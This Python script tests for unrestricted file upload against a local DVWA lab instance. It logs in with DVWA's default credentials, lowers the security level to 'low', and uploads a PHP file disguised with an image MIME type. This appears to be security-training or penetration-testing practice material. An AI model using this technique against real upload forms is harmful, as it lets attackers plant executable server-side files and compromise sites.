import re
import requests
from bs4 import BeautifulSoup

class FileUpload:
    def __init__(self, url):
        self.url = url
        self.session = None
        self.cookies = None
        self.csrfExist = False

    def checkCSRF(self) -> str:
        """Check if CSRF is enabled on the website.
        """
        r = self.session.get(self.url)
        soup = BeautifulSoup(r.text, 'html.parser')
        usrtkSoup = soup.find_all('input',attrs={'name':'user_token'})
        if usrtkSoup:
            self.csrfExist = True
            return "CSRF is enabled on the website"
        else:
            self.csrfExist = False
            return "CSRF is not enabled on the website"

    def getCSRFToken(self) -> str:
        """Get CSRF token from the login page of the website.
        """
        r = self.session.get(self.url)
        soup = BeautifulSoup(r.text, 'html.parser')
        usrtkSoup = soup.find_all('input',attrs={'name':'user_token'})
        if usrtkSoup:
            userToken = usrtkSoup[0]['value']
            return userToken
        else:
            print("No CSRF token found!")
            return None
    
    #Fix
    def dvwaLogin(self) -> str:
        """For DVWA only. Login to DVWA and return a session object.
        """
        payload = {
            'username': 'admin',
            'password': 'password',
            'Login': 'Login'
        }
        with requests.Session() as c:
            r = c.get('http://localhost/dvwa/login.php')
            token = re.search("user_token'\s*value='(.*?)'", r.text).group(1)
            payload['user_token'] = token
            c.post('http://localhost/dvwa/login.php', data=payload)
            self.cookies = c.cookies
        self.session = c

    def dvwaChangeSecurity(self, level):
        r = self.session.get(self.url)
        soup = BeautifulSoup(r.text, 'html.parser')
        usrtkSoup = soup.find_all('input',attrs={'name':'user_token'})
        if usrtkSoup:
            userToken = usrtkSoup[0]['value']
        print(userToken)
        data = {
            'security': level,
            'seclev_submit': 'Submit',
            'user_token': userToken
        }
        r = self.session.post('http://localhost/dvwa/security.php', data=data)
        print("Security level changed to " + level)
        return r
    
    def uploadfile(self):
        r = self.session.get(self.url)
        soup = BeautifulSoup(r.text, 'html.parser')
        forms = soup.find_all('form', attrs={'enctype':'multipart/form-data'})
        if not forms:
            print("URL is not valid for file upload")
            return
        print("URL is valid for file upload")
        if self.csrfExist:
            token = self.getCSRFToken()
        # Finding the file upload form and extracting the necessary fields
        dictInput = {}
        inputs = forms[0].find_all('input')
        if inputs:
            for i in inputs:
                if i["type"] == "file":
                    dictInput[i["name"]] = ""
                else:
                    dictInput[i["name"]] = i["value"]
        # Crafting the payload
        payload = {}
        for key in dictInput:
            if dictInput[key] != "":
                payload.update({key: (None, dictInput[key])})
            else:
                # Case of file:
                payload.update({key: ('test.php',open('source/tools/self_made/fileupload/test.php', 'rb'), "image/jpeg")})
        session = requests.Session()
        p = session.post(self.url, files=payload, cookies=self.cookies)
        if p.status_code != 200:
            print("File upload failed")
            return    
        soup = BeautifulSoup(p.text, 'html.parser')
        signature = soup.find_all(string=re.compile("uploaded", re.IGNORECASE))
        if signature:
            for s in signature:
                print(s)
            print("File uploaded successfully")
            
        
    
    def main(self):
        self.dvwaLogin()
        self.dvwaChangeSecurity("low")
        self.uploadfile()

a = FileUpload("http://localhost/dvwa/vulnerabilities/upload/")
a.main()